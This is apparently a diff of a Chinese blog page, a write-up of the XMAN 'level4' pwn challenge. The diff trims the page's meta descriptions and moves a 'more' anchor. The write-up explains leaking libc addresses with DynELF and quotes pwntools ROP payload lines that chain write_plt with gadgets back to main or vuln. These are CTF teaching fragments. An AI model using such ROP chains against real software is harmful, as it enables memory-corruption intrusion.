@@ -81,25 +81,16 @@
 
 
 
-<meta name="description" content="本题其实就是level3的一个升级版本，唯一的区别就是本题没有提供libc，可以通过DynELF泄漏函数真实地址。有一个地方需要注意，leak函数可以在write之后直接pop三个参数再返回main：
-payload+=p32(write_plt)+p32(pppr)+p32(1)+p32(address)+p32(4)+p32(main)
-也可以重新返回vuln：
-payload+=p32(w">
+<meta name="description" content="本题其实就是level3的一个升级版本，唯一的区别就是本题没有提供libc，可以通过DynELF泄漏函数真实地址。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XMAN-level4">
 <meta property="og:url" content="http://yunnigu.dropsec.xyz/2017/02/28/XMAN-level4/index.html">
 <meta property="og:site_name" content="YungGong">
-<meta property="og:description" content="本题其实就是level3的一个升级版本，唯一的区别就是本题没有提供libc，可以通过DynELF泄漏函数真实地址。有一个地方需要注意，leak函数可以在write之后直接pop三个参数再返回main：
-payload+=p32(write_plt)+p32(pppr)+p32(1)+p32(address)+p32(4)+p32(main)
-也可以重新返回vuln：
-payload+=p32(w">
-<meta property="og:updated_time" content="2020-04-27T08:56:00.408Z">
+<meta property="og:description" content="本题其实就是level3的一个升级版本，唯一的区别就是本题没有提供libc，可以通过DynELF泄漏函数真实地址。">
+<meta property="og:updated_time" content="2020-04-27T09:00:02.784Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XMAN-level4">
-<meta name="twitter:description" content="本题其实就是level3的一个升级版本，唯一的区别就是本题没有提供libc，可以通过DynELF泄漏函数真实地址。有一个地方需要注意，leak函数可以在write之后直接pop三个参数再返回main：
-payload+=p32(write_plt)+p32(pppr)+p32(1)+p32(address)+p32(4)+p32(main)
-也可以重新返回vuln：
-payload+=p32(w">
+<meta name="twitter:description" content="本题其实就是level3的一个升级版本，唯一的区别就是本题没有提供libc，可以通过DynELF泄漏函数真实地址。">
 
 
 
@@ -309,8 +300,7 @@ payload+=p32(w">
       
 
       
-        <a id="more"></a>
-<p>本题其实就是level3的一个升级版本，唯一的区别就是本题没有提供libc，可以通过DynELF泄漏函数真实地址。有一个地方需要注意，leak函数可以在write之后直接pop三个参数再返回main：</p>
+        <p>本题其实就是level3的一个升级版本，唯一的区别就是本题没有提供libc，可以通过DynELF泄漏函数真实地址。<br><a id="more"></a><br>有一个地方需要注意，leak函数可以在write之后直接pop三个参数再返回main：</p>
 <pre><code>payload+=p32(write_plt)+p32(pppr)+p32(1)+p32(address)+p32(4)+p32(main)
 </code></pre><p>也可以重新返回vuln：</p>
 <pre><code>payload+=p32(write_plt)+p32(vlun)+p32(1)+p32(address)+p32(4)
